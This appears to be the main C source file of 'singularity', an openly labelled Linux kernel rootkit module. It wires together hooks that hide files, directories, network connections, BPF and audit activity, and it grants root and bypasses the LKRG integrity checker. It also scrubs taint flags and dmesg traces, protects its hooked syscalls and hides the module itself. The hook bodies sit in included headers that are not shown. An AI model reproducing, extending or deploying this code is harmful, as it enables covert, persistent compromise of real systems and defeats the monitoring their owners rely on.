#include "include/core.h"
#include "include/reset_tainted.h"
#include "include/become_root.h"
#include "include/hiding_directory.h"
#include "include/hiding_stat.h"
#include "include/hiding_tcp.h"
#include "include/hooks_write.h"
#include "include/clear_taint_dmesg.h"
#include "include/hiding_chdir.h"
#include "include/hiding_readlink.h"
#include "include/hide_module.h"
#include "include/open.h"
#include "include/bpf_hook.h"
#include "include/icmp.h"
#include "include/trace.h"
#include "include/audit.h"
#include "include/task.h"
#include "include/lkrg_bypass.h"
#include "include/sysrq_hook.h"
#include "include/selfdefense.h"

static void sd_snapshot_all(void)
{
    sd_protect_symbol("__x64_sys_getdents");
    sd_protect_symbol("__x64_sys_getdents64");

    sd_protect_symbol("__x64_sys_stat");
    sd_protect_symbol("__x64_sys_lstat");
    sd_protect_symbol("__x64_sys_newstat");
    sd_protect_symbol("__x64_sys_newlstat");
    sd_protect_symbol("__x64_sys_statx");
    sd_protect_symbol("__x64_sys_newfstatat");
    sd_protect_symbol("__x64_sys_getpriority");

    sd_protect_symbol("__x64_sys_openat");

    sd_protect_symbol("__x64_sys_readlinkat");
    sd_protect_symbol("__x64_sys_readlink");

    sd_protect_symbol("__x64_sys_chdir");

    sd_protect_symbol("__x64_sys_read");
    sd_protect_symbol("__x64_sys_pread64");
    sd_protect_symbol("__x64_sys_readv");
    sd_protect_symbol("__x64_sys_preadv");
    sd_protect_symbol("do_syslog");
    sd_protect_symbol("sched_debug_show");

    sd_protect_symbol("__x64_sys_write");
    sd_protect_symbol("__x64_sys_writev");
    sd_protect_symbol("__x64_sys_pwrite64");
    sd_protect_symbol("__x64_sys_pwritev");
    sd_protect_symbol("__x64_sys_pwritev2");
    sd_protect_symbol("__x64_sys_sendfile");
    sd_protect_symbol("__x64_sys_sendfile64");
    sd_protect_symbol("__x64_sys_copy_file_range");
    sd_protect_symbol("__x64_sys_splice");
    sd_protect_symbol("__x64_sys_vmsplice");
    sd_protect_symbol("__x64_sys_tee");
    sd_protect_symbol("__x64_sys_io_uring_enter");

    sd_protect_symbol("__x64_sys_kill");
    sd_protect_symbol("__x64_sys_getsid");
    sd_protect_symbol("__x64_sys_getpgid");
    sd_protect_symbol("__x64_sys_getpgrp");
    sd_protect_symbol("__x64_sys_sched_getaffinity");
    sd_protect_symbol("__x64_sys_sched_getparam");
    sd_protect_symbol("__x64_sys_sched_getscheduler");
    sd_protect_symbol("__x64_sys_sched_rr_get_interval");
    sd_protect_symbol("__x64_sys_sysinfo");
    sd_protect_symbol("__x64_sys_pidfd_open");

    sd_protect_symbol("tcp4_seq_show");
    sd_protect_symbol("tcp6_seq_show");
    sd_protect_symbol("udp4_seq_show");
    sd_protect_symbol("udp6_seq_show");
    sd_protect_symbol("tpacket_rcv");

    sd_protect_symbol("__x64_sys_recvmsg");
    sd_protect_symbol("__x64_sys_recvfrom");
    sd_protect_symbol("netlink_unicast");
    sd_protect_symbol("audit_log_start");

    sd_protect_symbol("__x64_sys_bpf");
    sd_protect_symbol("bpf_iter_run_prog");
    sd_protect_symbol("bpf_seq_write");
    sd_protect_symbol("bpf_seq_printf");
    sd_protect_symbol("bpf_ringbuf_output");
    sd_protect_symbol("bpf_ringbuf_reserve");
    sd_protect_symbol("bpf_ringbuf_submit");
    sd_protect_symbol("bpf_map_lookup_elem");
    sd_protect_symbol("bpf_map_update_elem");
    sd_protect_symbol("array_map_update_elem");
    sd_protect_symbol("perf_event_output");
    sd_protect_symbol("perf_trace_run_bpf_submit");
    sd_protect_symbol("__bpf_prog_run");
    sd_protect_symbol("__ia32_sys_bpf");

    sd_protect_symbol("icmp_rcv");

    sd_protect_symbol("taskstats_user_cmd");

    sd_protect_symbol("__x64_sys_access");
    sd_protect_symbol("__x64_sys_faccessat");
    sd_protect_symbol("__x64_sys_faccessat2");

    sd_protect_symbol("__ia32_sys_read");
    sd_protect_symbol("__ia32_sys_write");
    sd_protect_symbol("__ia32_sys_getdents");
    sd_protect_symbol("__ia32_sys_getdents64");
    sd_protect_symbol("__ia32_sys_pwrite64");
    sd_protect_symbol("__ia32_compat_sys_pwrite64");
    sd_protect_symbol("__x64_sys_ia32_pwrite64");
}

static int __init singularity_init(void)
{
    int ret = 0;

    sd_protect_symbol("register_kprobe");

    ret = sd_bootstrap_kprobe_hook();
    if (ret) return ret;

    ret = lkrg_bypass_init();
    if (ret) return ret;

    sd_snapshot_all();

    ret = selfdefense_init();
    if (ret) return ret;

    ret |= reset_tainted_init();
    ret |= hiding_open_init();
    ret |= become_root_init();
    ret |= hiding_directory_init();
    ret |= hiding_stat_init();
    ret |= hiding_tcp_init();
    ret |= clear_taint_dmesg_init();
    ret |= hooks_write_init();
    ret |= hiding_chdir_init();
    ret |= hiding_readlink_init();
    ret |= bpf_hook_init();
    ret |= hiding_icmp_init();
    ret |= trace_pid_init();
    ret |= hooking_audit_init();
    ret |= taskstats_hook_init();
    ret |= sysrq_hook_init();

    module_hide_current_deferred();
    return ret;
}

static void __exit singularity_exit(void)
{
    module_hide_cancel_deferred();
    sysrq_hook_exit();
    taskstats_hook_exit();
    hooking_audit_exit();
    trace_pid_cleanup();
    hiding_icmp_exit();
    bpf_hook_exit();
    hiding_readlink_exit();
    hiding_chdir_exit();
    hooks_write_exit();
    clear_taint_dmesg_exit();
    hiding_tcp_exit();
    hiding_stat_exit();
    hiding_directory_exit();
    become_root_exit();
    hiding_open_exit();
    reset_tainted_exit();
    selfdefense_exit();
    lkrg_bypass_exit();
}

module_init(singularity_init);
module_exit(singularity_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("MatheuZSecurity");
MODULE_DESCRIPTION("Rootkit Researchers: https://discord.gg/66N5ZQppU7");
